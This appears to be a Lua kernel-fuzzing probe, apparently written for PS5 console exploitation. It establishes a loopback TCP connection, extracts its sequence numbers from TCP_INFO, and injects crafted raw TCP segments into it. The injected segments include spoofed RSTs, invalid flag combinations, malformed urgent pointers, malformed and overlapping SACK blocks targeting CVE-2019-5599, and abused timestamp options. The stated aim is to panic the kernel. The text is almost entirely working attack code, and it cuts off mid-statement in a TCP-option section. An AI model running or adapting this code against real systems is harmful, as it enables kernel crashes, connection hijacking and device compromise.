-- CRASH_CLASS: HIGH
-- PROBE 49a: TCP Stateful Injection via Loopback
--
-- Context: Probes 48b/48c confirmed kernel first-pass validation is solid
-- against cold malformed packets. To hit deeper bugs, we need STATEFUL
-- attacks — injecting crafted TCP segments into an ESTABLISHED connection.
--
-- Approach:
--   1. Create TCP listener on 127.0.0.1, connect, accept → ESTABLISHED
--   2. Exchange data to advance connection state
--   3. Dump TCP_INFO (236 bytes on PS5) before and after sending data
--      to identify which offsets hold sequence numbers (they change by
--      the exact byte count sent)
--   4. Use raw IP socket (IP_HDRINCL) to inject crafted TCP segments
--      into the live connection
--
-- Why this works:
--   - Loopback bypasses TCP checksum validation (if_simloop sets CSUM_DATA_VALID)
--   - Raw IP+TCP packets go: ip_output() → lo0 → ip_input() → tcp_input()
--   - tcp_input() processes our injected segments against the ESTABLISHED PCB
--   - This hits deep code: SACK processing, urgent data, window management,
--     RST handling, simultaneous close — all with a LIVE connection context
--
-- Key targets: CVE-2019-5599 (SACK Panic), tcp_sack_doack(), tcp_pulloutofband(),
--   persist timer, challenge ACK, RFC 5961 RST handling
--
-- A crash/reboot = kernel TCP state machine bug found.

print("=== PROBE 49a: TCP STATEFUL INJECTION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rw(addr)
    local ok, val = pcall(function() return memory.read_word(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wb(addr, val)
    local ok = pcall(function() memory.write_byte(addr, val) end)
    return ok
end
local function safe_ww(addr, val)
    local ok = pcall(function() memory.write_word(addr, val) end)
    return ok
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)

local sc_socket = make_syscall(97)
local sc_close = make_syscall(6)
local sc_bind = make_syscall(104)
local sc_listen = make_syscall(106)
local sc_connect = make_syscall(98)
local sc_accept = make_syscall(30)
local sc_write = make_syscall(4)
local sc_read = make_syscall(3)
local sc_setsockopt = make_syscall(105)
local sc_getsockopt = make_syscall(118)
local sc_getsockname = make_syscall(32)
local sc_sendto = make_syscall(133)

local AF_INET = 2
local SOCK_STREAM = 1
local SOCK_RAW = 3
local IPPROTO_TCP = 6

local SERVER_PORT = 44444
local sent_inject = 0
local inject_errors = 0

-- ============================================
-- SECTION A: Establish TCP connection on loopback
-- ============================================
print("--- SECTION A: TCP connection setup ---")

-- Create server socket
local srv_fd = -1
do
    local ok, ret = pcall(function()
        return sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0))
    end)
    srv_fd = ok and to_num(ret) or -1
    print("  server socket: fd=" .. srv_fd)
end
if srv_fd < 0 then
    print("=== PROBE 49a FAILED: no TCP socket ===")
    return
end

-- Allow address reuse
local one_buf = memory.alloc(4)
safe_wd(one_buf, 1)
pcall(function()
    sc_setsockopt(uint64(srv_fd), uint64(0xFFFF), uint64(0x0004),
        uint64(one_buf), uint64(4))  -- SOL_SOCKET, SO_REUSEADDR
end)

-- Bind to 127.0.0.1:44444
local srv_addr = memory.alloc(16)
safe_wb(srv_addr, 16)               -- sin_len
safe_wb(srv_addr + 1, AF_INET)      -- sin_family
safe_wb(srv_addr + 2, math.floor(SERVER_PORT / 256))  -- port high byte
safe_wb(srv_addr + 3, SERVER_PORT % 256)               -- port low byte
safe_wb(srv_addr + 4, 127)          -- 127.0.0.1
safe_wb(srv_addr + 5, 0)
safe_wb(srv_addr + 6, 0)
safe_wb(srv_addr + 7, 1)

local bind_ret = -999
do
    local ok, ret = pcall(function()
        return sc_bind(uint64(srv_fd), uint64(srv_addr), uint64(16))
    end)
    bind_ret = ok and to_num(ret) or -999
    print("  bind 127.0.0.1:" .. SERVER_PORT .. " → ret=" .. bind_ret)
end

-- Listen
local listen_ret = -999
do
    local ok, ret = pcall(function()
        return sc_listen(uint64(srv_fd), uint64(5))
    end)
    listen_ret = ok and to_num(ret) or -999
    print("  listen → ret=" .. listen_ret)
end

if bind_ret ~= 0 or listen_ret ~= 0 then
    print("  bind/listen failed, trying alternate port")
    pcall(function() sc_close(uint64(srv_fd)) end)
    -- Try port 55555
    SERVER_PORT = 55555
    local ok2, ret2 = pcall(function()
        return sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0))
    end)
    srv_fd = ok2 and to_num(ret2) or -1
    safe_wd(one_buf, 1)
    pcall(function()
        sc_setsockopt(uint64(srv_fd), uint64(0xFFFF), uint64(0x0004),
            uint64(one_buf), uint64(4))
    end)
    srv_addr = memory.alloc(16)
    safe_wb(srv_addr, 16)
    safe_wb(srv_addr + 1, AF_INET)
    safe_wb(srv_addr + 2, math.floor(SERVER_PORT / 256))
    safe_wb(srv_addr + 3, SERVER_PORT % 256)
    safe_wb(srv_addr + 4, 127); safe_wb(srv_addr + 5, 0)
    safe_wb(srv_addr + 6, 0); safe_wb(srv_addr + 7, 1)
    local ok3, ret3 = pcall(function()
        return sc_bind(uint64(srv_fd), uint64(srv_addr), uint64(16))
    end)
    bind_ret = ok3 and to_num(ret3) or -999
    local ok4, ret4 = pcall(function()
        return sc_listen(uint64(srv_fd), uint64(5))
    end)
    listen_ret = ok4 and to_num(ret4) or -999
    print("  retry port " .. SERVER_PORT .. " bind=" .. bind_ret .. " listen=" .. listen_ret)
end

if bind_ret ~= 0 or listen_ret ~= 0 then
    print("=== PROBE 49a FAILED: cannot bind/listen ===")
    pcall(function() sc_close(uint64(srv_fd)) end)
    return
end

-- Create client socket and connect
local cli_fd = -1
do
    local ok, ret = pcall(function()
        return sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0))
    end)
    cli_fd = ok and to_num(ret) or -1
    print("  client socket: fd=" .. cli_fd)
end

local conn_ret = -999
do
    local ok, ret = pcall(function()
        return sc_connect(uint64(cli_fd), uint64(srv_addr), uint64(16))
    end)
    conn_ret = ok and to_num(ret) or -999
    print("  connect → ret=" .. conn_ret)
end

if conn_ret ~= 0 then
    print("=== PROBE 49a FAILED: cannot connect ===")
    pcall(function() sc_close(uint64(cli_fd)) end)
    pcall(function() sc_close(uint64(srv_fd)) end)
    return
end

-- Accept on server side
local acc_fd = -1
local acc_addr = memory.alloc(16)
local acc_len = memory.alloc(4)
safe_wd(acc_len, 16)
do
    local ok, ret = pcall(function()
        return sc_accept(uint64(srv_fd), uint64(acc_addr), uint64(acc_len))
    end)
    acc_fd = ok and to_num(ret) or -1
    print("  accept → fd=" .. acc_fd)
end

if acc_fd < 0 then
    print("=== PROBE 49a FAILED: accept failed ===")
    pcall(function() sc_close(uint64(cli_fd)) end)
    pcall(function() sc_close(uint64(srv_fd)) end)
    return
end

-- Get client's ephemeral port via getsockname
local cli_name = memory.alloc(16)
local cli_name_len = memory.alloc(4)
safe_wd(cli_name_len, 16)
pcall(function()
    sc_getsockname(uint64(cli_fd), uint64(cli_name), uint64(cli_name_len))
end)
local cli_port_hi = safe_rb(cli_name + 2) or 0
local cli_port_lo = safe_rb(cli_name + 3) or 0
local cli_port = cli_port_hi * 256 + cli_port_lo
print("  client port: " .. cli_port)
print("  connection: 127.0.0.1:" .. cli_port .. " → 127.0.0.1:" .. SERVER_PORT)
print("")

-- ============================================
-- SECTION B: TCP_INFO dump — find sequence numbers
-- ============================================
print("--- SECTION B: TCP_INFO sequence number discovery ---")

local function dump_tcp_info(fd, label)
    local info = memory.alloc(256)
    for i = 0, 255 do safe_wb(info + i, 0) end
    local len_p = memory.alloc(4)
    safe_wd(len_p, 240)
    local ok, ret = pcall(function()
        return sc_getsockopt(uint64(fd), uint64(IPPROTO_TCP), uint64(32),
            uint64(info), uint64(len_p))
    end)
    local gso_ret = ok and to_num(ret) or -999
    local actual_len = safe_rd(len_p) or 0
    print("  " .. label .. ": getsockopt ret=" .. gso_ret .. " len=" .. actual_len)

    -- Dump all dwords
    local dwords = {}
    for i = 0, math.min(actual_len, 236) - 1, 4 do
        local v = safe_rd(info + i) or 0
        dwords[i] = v
    end

    -- Print hex dump of all dwords with offset
    local hex_lines = {}
    for i = 0, math.min(actual_len, 236) - 1, 4 do
        local v = dwords[i] or 0
        table.insert(hex_lines, string.format("    +%03d: 0x%08X (%u)", i, v, v))
    end
    -- Print first 20 and last 10 to keep output manageable
    for idx = 1, math.min(20, #hex_lines) do
        print(hex_lines[idx])
    end
    if #hex_lines > 30 then
        print("    ... (" .. (#hex_lines - 30) .. " lines omitted) ...")
    end
    for idx = math.max(21, #hex_lines - 9), #hex_lines do
        print(hex_lines[idx])
    end

    return dwords, actual_len
end

-- Dump TCP_INFO BEFORE sending data (both client and server sides)
print("  [before data exchange]")
local info_cli_before, cli_info_len = dump_tcp_info(cli_fd, "client")
local info_acc_before, acc_info_len = dump_tcp_info(acc_fd, "server(accepted)")
print("")

-- Send exactly 100 bytes from client → server
local send_buf = memory.alloc(128)
for i = 0, 99 do safe_wb(send_buf + i, 0x41 + (i % 26)) end
local write_ret = -999
do
    local ok, ret = pcall(function()
        return sc_write(uint64(cli_fd), uint64(send_buf), uint64(100))
    end)
    write_ret = ok and to_num(ret) or -999
    print("  client write 100 bytes → ret=" .. write_ret)
end

-- Read on server side to complete the transfer
local recv_buf = memory.alloc(128)
local read_ret = -999
do
    local ok, ret = pcall(function()
        return sc_read(uint64(acc_fd), uint64(recv_buf), uint64(128))
    end)
    read_ret = ok and to_num(ret) or -999
    print("  server read → ret=" .. read_ret)
end

-- Send 50 bytes from server → client
local send_buf2 = memory.alloc(64)
for i = 0, 49 do safe_wb(send_buf2 + i, 0x61 + (i % 26)) end
local write2_ret = -999
do
    local ok, ret = pcall(function()
        return sc_write(uint64(acc_fd), uint64(send_buf2), uint64(50))
    end)
    write2_ret = ok and to_num(ret) or -999
    print("  server write 50 bytes → ret=" .. write2_ret)
end

-- Read on client
do
    local ok, ret = pcall(function()
        return sc_read(uint64(cli_fd), uint64(recv_buf), uint64(128))
    end)
    local rr = ok and to_num(ret) or -999
    print("  client read → ret=" .. rr)
end

print("")

-- Dump TCP_INFO AFTER data exchange
print("  [after data exchange: client sent 100, server sent 50]")
local info_cli_after = dump_tcp_info(cli_fd, "client")
local info_acc_after = dump_tcp_info(acc_fd, "server(accepted)")
print("")

-- Find fields that changed by exactly 100 (client's seq-related) or 50 (server's seq-related)
print("  [sequence number analysis]")
local cli_seq_offset = nil
local cli_ack_offset = nil
local srv_seq_offset = nil
local srv_ack_offset = nil

for i = 0, 232, 4 do
    local before_c = info_cli_before[i] or 0
    local after_c = info_cli_after[i] or 0
    local diff_c = after_c - before_c

    -- Client: snd_nxt should increase by 100 (bytes client sent)
    if diff_c == 100 and before_c > 0x10000 then
        print(string.format("    CLI +%03d: changed by +100 (0x%08X → 0x%08X) ★ LIKELY SND_NXT",
            i, before_c, after_c))
        cli_seq_offset = i
    end
    -- Client: rcv_nxt should increase by 50 (bytes server sent)
    if diff_c == 50 and before_c > 0x10000 then
        print(string.format("    CLI +%03d: changed by +50  (0x%08X → 0x%08X) ★ LIKELY RCV_NXT",
            i, before_c, after_c))
        cli_ack_offset = i
    end

    local before_s = info_acc_before[i] or 0
    local after_s = info_acc_after[i] or 0
    local diff_s = after_s - before_s

    -- Server: snd_nxt should increase by 50 (bytes server sent)
    if diff_s == 50 and before_s > 0x10000 then
        print(string.format("    SRV +%03d: changed by +50  (0x%08X → 0x%08X) ★ LIKELY SND_NXT",
            i, before_s, after_s))
        srv_seq_offset = i
    end
    -- Server: rcv_nxt should increase by 100 (bytes client sent)
    if diff_s == 100 and before_s > 0x10000 then
        print(string.format("    SRV +%03d: changed by +100 (0x%08X → 0x%08X) ★ LIKELY RCV_NXT",
            i, before_s, after_s))
        srv_ack_offset = i
    end
end

-- Extract current sequence numbers (from server's perspective for injection toward server)
-- To inject as if we're the CLIENT talking to the SERVER:
--   src_port = cli_port, dst_port = SERVER_PORT
--   seq = client's snd_nxt (what server expects next)
--   ack = client's rcv_nxt (what client has received)
local inject_seq = 0
local inject_ack = 0

if cli_seq_offset then
    inject_seq = info_cli_after[cli_seq_offset] or 0
    print(string.format("  → inject seq (client snd_nxt): 0x%08X", inject_seq))
end
if cli_ack_offset then
    inject_ack = info_cli_after[cli_ack_offset] or 0
    print(string.format("  → inject ack (client rcv_nxt): 0x%08X", inject_ack))
end

local have_seq = (inject_seq ~= 0 and inject_ack ~= 0)
if have_seq then
    print("  ★ SEQUENCE NUMBERS FOUND — precise injection possible!")
else
    print("  sequence numbers not found in TCP_INFO — will use blind injection")
end
print("")

-- ============================================
-- SECTION C: Raw socket for injection
-- ============================================
print("--- SECTION C: Raw socket setup ---")

local raw_fd = -1
do
    local ok, ret = pcall(function()
        return sc_socket(uint64(AF_INET), uint64(SOCK_RAW), uint64(255))  -- IPPROTO_RAW
    end)
    raw_fd = ok and to_num(ret) or -1
    print("  raw socket: fd=" .. raw_fd)
end

if raw_fd < 0 then
    print("=== SECTION C FAILED: no raw socket ===")
else
    -- IP_HDRINCL
    local optval = memory.alloc(4)
    safe_wd(optval, 1)
    pcall(function()
        sc_setsockopt(uint64(raw_fd), uint64(0), uint64(2), uint64(optval), uint64(4))
    end)
    print("  IP_HDRINCL set")
end

-- Destination for sendto
local lo_sa = memory.alloc(16)
safe_wb(lo_sa, 16); safe_wb(lo_sa + 1, AF_INET)
safe_wb(lo_sa + 4, 127); safe_wb(lo_sa + 5, 0)
safe_wb(lo_sa + 6, 0); safe_wb(lo_sa + 7, 1)

-- Packet buffer
local pkt = memory.alloc(512)

-- Build IP header for TCP (proto=6)
local function build_ip(total_len)
    safe_wb(pkt, 0x45)              -- version 4, ihl 5
    safe_wb(pkt + 1, 0)             -- TOS
    safe_wb(pkt + 2, math.floor(total_len / 256))
    safe_wb(pkt + 3, total_len % 256)
    safe_ww(pkt + 4, 0x4900)        -- identification
    safe_ww(pkt + 6, 0x4000)        -- DF flag
    safe_wb(pkt + 8, 64)            -- TTL
    safe_wb(pkt + 9, 6)             -- protocol = TCP
    safe_ww(pkt + 10, 0)            -- checksum (kernel fills)
    -- src = 127.0.0.1
    safe_wb(pkt + 12, 127); safe_wb(pkt + 13, 0)
    safe_wb(pkt + 14, 0); safe_wb(pkt + 15, 1)
    -- dst = 127.0.0.1
    safe_wb(pkt + 16, 127); safe_wb(pkt + 17, 0)
    safe_wb(pkt + 18, 0); safe_wb(pkt + 19, 1)
end

-- Build TCP header at offset 20 in pkt
-- TCP header: src_port(2) + dst_port(2) + seq(4) + ack(4) + off_flags(2) + win(2) + cksum(2) + urg(2)
local function build_tcp(src_port, dst_port, seq, ack, flags, window, opts_bytes)
    local base = 20
    -- Source port (big-endian)
    safe_wb(pkt + base, math.floor(src_port / 256))
    safe_wb(pkt + base + 1, src_port % 256)
    -- Dest port (big-endian)
    safe_wb(pkt + base + 2, math.floor(dst_port / 256))
    safe_wb(pkt + base + 3, dst_port % 256)
    -- Sequence number (big-endian 32-bit)
    safe_wb(pkt + base + 4, math.floor(seq / 0x1000000) % 256)
    safe_wb(pkt + base + 5, math.floor(seq / 0x10000) % 256)
    safe_wb(pkt + base + 6, math.floor(seq / 0x100) % 256)
    safe_wb(pkt + base + 7, seq % 256)
    -- ACK number (big-endian 32-bit)
    safe_wb(pkt + base + 8, math.floor(ack / 0x1000000) % 256)
    safe_wb(pkt + base + 9, math.floor(ack / 0x10000) % 256)
    safe_wb(pkt + base + 10, math.floor(ack / 0x100) % 256)
    safe_wb(pkt + base + 11, ack % 256)
    -- Data offset (header length in 32-bit words) + flags
    local hdr_words = 5  -- 20 bytes minimum
    if opts_bytes and #opts_bytes > 0 then
        hdr_words = 5 + math.ceil(#opts_bytes / 4)
    end
    safe_wb(pkt + base + 12, hdr_words * 16)  -- data offset in high nibble
    safe_wb(pkt + base + 13, flags)
    -- Window
    safe_wb(pkt + base + 14, math.floor(window / 256))
    safe_wb(pkt + base + 15, window % 256)
    -- Checksum = 0 (loopback marks valid)
    safe_ww(pkt + base + 16, 0)
    -- Urgent pointer = 0
    safe_ww(pkt + base + 18, 0)
    -- Options
    if opts_bytes then
        for i = 1, #opts_bytes do
            safe_wb(pkt + base + 20 + i - 1, opts_bytes:byte(i))
        end
        -- Pad to 4-byte boundary
        local padded = math.ceil(#opts_bytes / 4) * 4
        for i = #opts_bytes, padded - 1 do
            safe_wb(pkt + base + 20 + i, 0)  -- NOP/EOL padding
        end
    end
    return hdr_words * 4  -- TCP header length
end

-- TCP flags
local TCP_FIN = 0x01
local TCP_SYN = 0x02
local TCP_RST = 0x04
local TCP_PSH = 0x08
local TCP_ACK = 0x10
local TCP_URG = 0x20

local function send_inject(total_len, name)
    if raw_fd < 0 then
        print("  [SKIP] " .. name .. " (no raw socket)")
        return -1
    end
    build_ip(total_len)
    local ok, ret = pcall(function()
        return sc_sendto(uint64(raw_fd), uint64(pkt), uint64(total_len),
            uint64(0), uint64(lo_sa), uint64(16))
    end)
    local rv = ok and to_num(ret) or -999
    if rv >= 0 then
        sent_inject = sent_inject + 1
    else
        inject_errors = inject_errors + 1
    end
    print(string.format("  %-42s ret=%d", name, rv))
    return rv
end

print("")

-- ============================================
-- SECTION D: TCP injection attacks
-- ============================================
print("--- SECTION D: TCP segment injection ---")
print(string.format("  Injecting as CLIENT (%d → %d)", cli_port, SERVER_PORT))
if have_seq then
    print(string.format("  seq=0x%08X ack=0x%08X", inject_seq, inject_ack))
end
print("")

-- Use actual seq if known, otherwise use 0 (blind)
local seq = inject_seq
local ack = inject_ack
if not have_seq then
    seq = 0x80000000
    ack = 0x80000000
end

-- D1: ACK with valid seq/ack (baseline — should be accepted silently)
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, nil)
send_inject(40, "D1: ACK valid (baseline)")

-- D2: RST with exact seq (should close connection if seq matches rcv_nxt)
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq, 0, TCP_RST, 0, nil)
send_inject(40, "D2: RST exact seq")

-- After RST, connection may be closed. Re-check state.
do
    local info_check = memory.alloc(8)
    safe_wd(info_check, 0)
    local len_check = memory.alloc(4)
    safe_wd(len_check, 4)
    pcall(function()
        sc_getsockopt(uint64(acc_fd), uint64(IPPROTO_TCP), uint64(32),
            uint64(info_check), uint64(len_check))
    end)
    local state = safe_rb(info_check) or 255
    -- TCP states: 0=CLOSED, 1=LISTEN, 2=SYN_SENT, 3=SYN_RCVD, 4=ESTABLISHED
    print(string.format("  server TCP state after RST: %d (4=ESTABLISHED)", state))
    if state ~= 4 then
        print("  → connection was reset! RST injection worked.")
        print("  → re-establishing for more tests...")
        -- Close old and re-establish
        pcall(function() sc_close(uint64(acc_fd)) end)
        pcall(function() sc_close(uint64(cli_fd)) end)

        cli_fd = -1
        do
            local ok2, r2 = pcall(function()
                return sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0))
            end)
            cli_fd = ok2 and to_num(r2) or -1
        end
        do
            local ok3, r3 = pcall(function()
                return sc_connect(uint64(cli_fd), uint64(srv_addr), uint64(16))
            end)
        end
        safe_wd(acc_len, 16)
        do
            local ok4, r4 = pcall(function()
                return sc_accept(uint64(srv_fd), uint64(acc_addr), uint64(acc_len))
            end)
            acc_fd = ok4 and to_num(r4) or -1
            print("  new accept fd=" .. acc_fd)
        end
        -- Get new client port
        safe_wd(cli_name_len, 16)
        pcall(function()
            sc_getsockname(uint64(cli_fd), uint64(cli_name), uint64(cli_name_len))
        end)
        cli_port = (safe_rb(cli_name + 2) or 0) * 256 + (safe_rb(cli_name + 3) or 0)
        print("  new client port: " .. cli_port)

        -- Re-derive seq numbers
        -- Send data both ways
        for i2 = 0, 99 do safe_wb(send_buf + i2, 0x41) end
        pcall(function() sc_write(uint64(cli_fd), uint64(send_buf), uint64(100)) end)
        pcall(function() sc_read(uint64(acc_fd), uint64(recv_buf), uint64(128)) end)
        for i2 = 0, 49 do safe_wb(send_buf2 + i2, 0x61) end
        pcall(function() sc_write(uint64(acc_fd), uint64(send_buf2), uint64(50)) end)
        pcall(function() sc_read(uint64(cli_fd), uint64(recv_buf), uint64(128)) end)

        if cli_seq_offset then
            local new_info = memory.alloc(256)
            for i2 = 0, 255 do safe_wb(new_info + i2, 0) end
            local new_len = memory.alloc(4)
            safe_wd(new_len, 240)
            pcall(function()
                sc_getsockopt(uint64(cli_fd), uint64(IPPROTO_TCP), uint64(32),
                    uint64(new_info), uint64(new_len))
            end)
            seq = safe_rd(new_info + cli_seq_offset) or 0
            if cli_ack_offset then
                ack = safe_rd(new_info + cli_ack_offset) or 0
            end
            print(string.format("  new seq=0x%08X ack=0x%08X", seq, ack))
        end
    end
end
print("")

-- D3: SYN in ESTABLISHED state (should trigger challenge ACK per RFC 5961)
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq - 1, 0, TCP_SYN, 65535, nil)
send_inject(40, "D3: SYN in ESTABLISHED (challenge ACK?)")

-- D4: FIN with valid seq
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_FIN + TCP_ACK, 65535, nil)
send_inject(40, "D4: FIN+ACK valid seq")

-- D5: RST+SYN (invalid combo)
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_RST + TCP_SYN, 65535, nil)
send_inject(40, "D5: RST+SYN invalid combo")

-- D6: All flags set
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq, ack, 0xFF, 65535, nil)
send_inject(40, "D6: all TCP flags set (0xFF)")

-- D7: Window = 0 (zero window → persist timer)
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 0, nil)
send_inject(40, "D7: ACK window=0 (persist timer)")

-- D8: Window shrink (window smaller than previously advertised)
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 1, nil)
send_inject(40, "D8: ACK window=1 (shrink)")

-- D9: URG flag with urgent pointer past data
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_URG + TCP_ACK, 65535, nil)
-- Set urgent pointer to 0xFFFF
safe_wb(pkt + 38, 0xFF)
safe_wb(pkt + 39, 0xFF)
send_inject(40, "D9: URG ptr=0xFFFF (no data)")

-- D10: URG with data and large urgent pointer
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_URG + TCP_PSH + TCP_ACK, 65535, nil)
safe_wb(pkt + 38, 0xFF); safe_wb(pkt + 39, 0xFF)  -- urg ptr
-- Add 100 bytes of data after TCP header
for i = 0, 99 do safe_wb(pkt + 40 + i, 0xBB) end
send_inject(140, "D10: URG+data 100B ptr=0xFFFF")

-- D11: Data with seq far in the future (out of window)
for i = 0, 511 do safe_wb(pkt + i, 0) end
local future_seq = (seq + 0x7FFFFFFF) % 0x100000000
build_tcp(cli_port, SERVER_PORT, future_seq, ack, TCP_ACK, 65535, nil)
for i = 0, 49 do safe_wb(pkt + 40 + i, 0xCC) end
send_inject(90, "D11: data seq far future (+2GB)")

-- D12: Data with seq in the past (already ACKed)
for i = 0, 511 do safe_wb(pkt + i, 0) end
local past_seq = (seq - 1000 + 0x100000000) % 0x100000000
build_tcp(cli_port, SERVER_PORT, past_seq, ack, TCP_ACK, 65535, nil)
for i = 0, 49 do safe_wb(pkt + 40 + i, 0xDD) end
send_inject(90, "D12: data seq in past (-1000)")

-- D13: ACK with ack number far in the future
for i = 0, 511 do safe_wb(pkt + i, 0) end
local future_ack = (ack + 0x7FFFFFFF) % 0x100000000
build_tcp(cli_port, SERVER_PORT, seq, future_ack, TCP_ACK, 65535, nil)
send_inject(40, "D13: ACK ack_num far future (+2GB)")

print("")

-- ============================================
-- SECTION E: TCP option injection (SACK, timestamps)
-- ============================================
print("--- SECTION E: TCP option attacks ---")
print("  Targets: SACK processing (CVE-2019-5599), timestamp PAWS")
print("")

-- E1: SACK option with 1 valid-looking block
-- SACK: kind=5, len=10, left_edge(4) + right_edge(4)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local sack_opts = string.char(
        5, 10,                              -- kind=5 (SACK), len=10
        0, 0, 0, 1,                         -- left edge = 1
        0, 0, 0, 100,                       -- right edge = 100
        0, 0                                -- padding (NOP NOP or EOL)
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, sack_opts)
    send_inject(20 + 32, "E1: SACK 1 block [1-100]")
end

-- E2: SACK with 4 blocks (maximum standard)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local sack_opts = string.char(
        1, 1,                               -- NOP, NOP (alignment)
        5, 34,                              -- kind=5, len=34 (4 blocks)
        -- Block 1
        0, 0, 1, 0,    0, 0, 2, 0,         -- [256, 512]
        -- Block 2
        0, 0, 4, 0,    0, 0, 8, 0,         -- [1024, 2048]
        -- Block 3
        0, 1, 0, 0,    0, 2, 0, 0,         -- [65536, 131072]
        -- Block 4
        0x7F, 0xFF, 0xFF, 0x00,             -- [2147483392, 2147483647]
        0x7F, 0xFF, 0xFF, 0xFF
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, sack_opts)
    send_inject(20 + 56, "E2: SACK 4 blocks (max)")
end

-- E3: SACK with left > right (invalid block)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local sack_opts = string.char(
        1, 1,
        5, 10,
        0, 0, 1, 0,                         -- left = 256
        0, 0, 0, 1                           -- right = 1 (LEFT > RIGHT!)
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, sack_opts)
    send_inject(20 + 32, "E3: SACK left > right (invalid)")
end

-- E4: SACK with overlapping blocks
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local sack_opts = string.char(
        1, 1,
        5, 18,                              -- 2 blocks
        0, 0, 0, 10,   0, 0, 0, 100,       -- [10, 100]
        0, 0, 0, 50,   0, 0, 0, 200        -- [50, 200] overlaps!
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, sack_opts)
    send_inject(20 + 40, "E4: SACK overlapping blocks")
end

-- E5: SACK with zero-width block (left == right)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local sack_opts = string.char(
        1, 1,
        5, 10,
        0, 0, 1, 0,   0, 0, 1, 0           -- [256, 256] zero width!
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, sack_opts)
    send_inject(20 + 32, "E5: SACK zero-width [256,256]")
end

-- E6: SACK option claiming more blocks than bytes allow (len mismatch)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local sack_opts = string.char(
        1, 1,
        5, 50,                              -- claims 50 bytes (6 blocks) but only 1 block follows
        0, 0, 0, 1,   0, 0, 1, 0           -- only 8 bytes of block data
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, sack_opts)
    send_inject(20 + 32, "E6: SACK len=50 but only 1 block")
end

-- E7: SACK with sequence numbers near inject_ack (in-window SACK)
if have_seq then
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local a = ack
    local sack_opts = string.char(
        1, 1,
        5, 10,
        math.floor(a / 0x1000000) % 256,
        math.floor(a / 0x10000) % 256,
        math.floor(a / 0x100) % 256,
        a % 256,
        math.floor((a + 100) / 0x1000000) % 256,
        math.floor((a + 100) / 0x10000) % 256,
        math.floor((a + 100) / 0x100) % 256,
        (a + 100) % 256
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, sack_opts)
    send_inject(20 + 32, "E7: SACK in-window [ack, ack+100]")
end

-- E8: Timestamp option with PAWS violation (ts < recent)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local ts_opts = string.char(
        1, 1,                               -- NOP NOP
        8, 10,                              -- Timestamp kind=8, len=10
        0, 0, 0, 1,                         -- TSval = 1 (very old)
        0, 0, 0, 0                          -- TSecr = 0
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, ts_opts)
    send_inject(20 + 32, "E8: Timestamp TSval=1 (PAWS old)")
end

-- E9: Timestamp with TSval=0xFFFFFFFF (wraparound)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local ts_opts = string.char(
        1, 1,
        8, 10,
        0xFF, 0xFF, 0xFF, 0xFF,             -- TSval = max
        0xFF, 0xFF, 0xFF, 0xFF              -- TSecr = max
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, ts_opts)
    send_inject(20 + 32, "E9: Timestamp TSval=max TSecr=max")
end

-- E10: MSS option in non-SYN (should be ignored per RFC but bugs happen)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local mss_opts = string.char(
        2, 4, 0x00, 0x01,                   -- MSS = 1 (minimum)
        0, 0, 0, 0                           -- padding
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, mss_opts)
    send_inject(20 + 28, "E10: MSS=1 in non-SYN")
end

-- E11: Window scale in non-SYN
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local ws_opts = string.char(
        1,                                   -- NOP
